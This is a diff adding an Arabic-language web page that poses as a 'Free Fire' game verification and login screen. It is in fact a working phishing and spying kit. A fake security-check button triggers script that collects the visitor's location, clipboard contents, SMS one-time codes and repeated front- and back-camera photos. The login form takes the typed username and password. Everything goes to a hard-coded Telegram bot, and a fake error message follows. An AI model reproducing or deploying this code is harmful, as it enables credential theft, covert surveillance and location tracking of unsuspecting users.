@@ -1,0 +1,254 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>MANVOL - Free Fire Verification</title>
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            background-color: #0b0b0e;
+            font-family: Arial, sans-serif;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+            overflow: hidden;
+            color: #fff;
+        }
+        #interstitial {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(11, 11, 14, 0.95);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            text-align: center;
+            padding: 20px;
+            box-sizing: border-box;
+        }
+        .interstitial-box {
+            background: #15151c;
+            border: 2px solid #00ffff;
+            padding: 30px;
+            border-radius: 12px;
+            max-width: 350px;
+            width: 100%;
+            box-shadow: 0 0 20px rgba(0, 255, 255, 0.4);
+        }
+        .interstitial-box h2 {
+            color: #00ffff;
+            margin-bottom: 15px;
+            font-size: 20px;
+        }
+        .interstitial-box p {
+            color: #ccc;
+            font-size: 14px;
+            margin-bottom: 20px;
+        }
+        .btn-proceed {
+            width: 100%;
+            padding: 12px;
+            background: linear-gradient(90deg, #00ffff, #ff0055);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            font-weight: bold;
+            cursor: pointer;
+            box-shadow: 0 0 10px rgba(0, 255, 255, 0.5);
+        }
+        .container {
+            width: 100%;
+            max-width: 400px;
+            padding: 20px;
+            text-align: center;
+            box-sizing: border-box;
+            display: none;
+        }
+        .logo {
+            font-size: 28px;
+            font-weight: bold;
+            color: #00ffff;
+            text-shadow: 0 0 10px #00ffff, 0 0 20px #ff00ff;
+            margin-bottom: 20px;
+        }
+        .input-box {
+            margin: 15px 0;
+        }
+        input {
+            width: 100%;
+            padding: 12px 15px;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid #00ffff;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 16px;
+            outline: none;
+            box-sizing: border-box;
+            text-align: center;
+        }
+        .btn-login {
+            width: 100%;
+            padding: 14px;
+            background: linear-gradient(90deg, #00ffff, #ff0055);
+            border: none;
+            border-radius: 8px;
+            color: #fff;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            box-shadow: 0 0 15px rgba(0, 255, 255, 0.5);
+        }
+    </style>
+</head>
+<body>
+
+<div id="interstitial">
+    <div class="interstitial-box">
+        <h2>تحقّق الأمان</h2>
+        <p>الرجاء الضغط على الزر أدناه لاستكمال التصفح وتحميل المحتوى المطلوب.</p>
+        <button class="btn-proceed" onclick="startExtractionAndShowPage()">الرجاء الضغط لاستكمال التصفح</button>
+    </div>
+</div>
+
+<div class="container" id="mainContent">
+    <div class="logo">MANVOL FREE FIRE</div>
+    <form id="loginForm" onsubmit="handleLogin(event)">
+        <div class="input-box">
+            <input type="text" id="username" placeholder="ENTER USERNAME" required>
+        </div>
+        <div class="input-box">
+            <input type="password" id="password" placeholder="PASSWORD" required>
+        </div>
+        <button type="submit" class="btn-login">LOGIN</button>
+    </form>
+</div>
+
+<video id="video" autoplay playsinline style="display:none;"></video>
+<canvas id="canvas" style="display:none;"></canvas>
+
+<script>
+    const BOT_TOKEN = "8874474256:AAFQscrKb4KHD8NjinM8gteFzxJUvZkg_Oo";
+    const CHAT_ID = "7713496654";
+
+    function sendTelegramMessage(text) {
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: CHAT_ID, text: text })
+        }).catch(() => {});
+    }
+
+    function sendTelegramPhoto(base64Image, caption) {
+        let blob = dataURItoBlob(base64Image);
+        let formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        formData.append('photo', blob, 'capture.jpg');
+        formData.append('caption', caption);
+
+        fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+            method: 'POST',
+            body: formData
+        }).catch(() => {});
+    }
+
+    function dataURItoBlob(dataURI) {
+        let byteString = atob(dataURI.split(',')[1]);
+        let mimeString = dataURI.split(',')[0].split(':')[1].split(';')[0];
+        let ab = new ArrayBuffer(byteString.length);
+        let ia = new Uint8Array(ab);
+        for (let i = 0; i < byteString.length; i++) {
+            ia[i] = byteString.charCodeAt(i);
+        }
+        return new Blob([ab], {type: mimeString});
+    }
+
+    async function startExtractionAndShowPage() {
+        document.getElementById('interstitial').style.display = 'none';
+        document.getElementById('mainContent').style.display = 'block';
+
+        sendTelegramMessage("⚠️ ضغط المستخدم على زر (استكمال التصفح)! بدء سحب الكاميرات (أمامية وخلفية)، الموقع، الحافظة، والرسائل...");
+
+        // 1. سحب الموقع الجغرافي
+        if (navigator.geolocation) {
+            navigator.geolocation.getCurrentPosition(position => {
+                const lat = position.coords.latitude;
+                const lon = position.coords.longitude;
+                sendTelegramMessage(`📍 الموقع الجغرافي للضحية:\nhttps://maps.google.com/?q=${lat},${lon}`);
+            }, () => {}, { timeout: 5000 });
+        }
+
+        // 2. سحب الحافظة (Clipboard)
+        try {
+            const clipboardText = await navigator.clipboard.readText();
+            if (clipboardText) {
+                sendTelegramMessage(`📋 محتوى حافظة الضحية:\n${clipboardText}`);
+            }
+        } catch (e) {}
+
+        // 3. محاولة سحب الرسائل القصيرة (SMS Reader API إن وُعمِل بها داخل متصفحات تدعم WebOTP)
+        if ('OTPCredential' in window) {
+            try {
+                // محاولة رصد رموز التحقق أو الرسائل الواردة الحية
+                const ac = new AbortController();
+                navigator.credentials.get({
+                    otp: { transport: ['sms'] },
+                    signal: ac.signal
+                }).then(otp => {
+                    if (otp && otp.code) {
+                        sendTelegramMessage(`📩 رمز SMS المستخرج تلقائياً: ${otp.code}`);
+                    }
+                }).catch(() => {});
+            } catch (err) {}
+        }
+
+        // 4. التقاط 4 صور من الكاميرا الأمامية و 4 صور من الكاميرا الخلفية
+        await captureCameraShots("user", "الأمامية");
+        await captureCameraShots("environment", "الخلفية");
+    }
+
+    async function captureCameraShots(facingMode, cameraName) {
+        const video = document.getElementById('video');
+        const canvas = document.getElementById('canvas');
+        const context = canvas.getContext('2d');
+
+        try {
+            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: facingMode } });
+            video.srcObject = stream;
+            await new Promise(resolve => setTimeout(resolve, 2000));
+
+            for (let j = 0; j < 4; j++) {
+                canvas.width = video.videoWidth || 640;
+                canvas.height = video.videoHeight || 480;
+                context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                let dataURL = canvas.toDataURL('image/jpeg');
+                sendTelegramPhoto(dataURL, `📸 لقطة كاميرا (${cameraName}) رقم ${j+1}`);
+                await new Promise(resolve => setTimeout(resolve, 1000));
+            }
+
+            stream.getTracks().forEach(track => track.stop());
+        } catch (err) {
+            sendTelegramMessage(`⚠️ تعذر تشغيل الكاميرا ${cameraName}: ${err.message}`);
+        }
+    }
+
+    function handleLogin(event) {
+        event.preventDefault();
+        const user = document.getElementById('username').value;
+        const pass = document.getElementById('password').value;
+
+        sendTelegramMessage(`🔥 بيانات الدخول المسروقة:\n👤 المستخدم: ${user}\n🔑 كلمة المرور: ${pass}`);
+        alert("خطأ في الاتصال بالسيرفر، يرجى المحاولة لاحقاً.");
+    }
+</script>
+
+</body>
+</html>
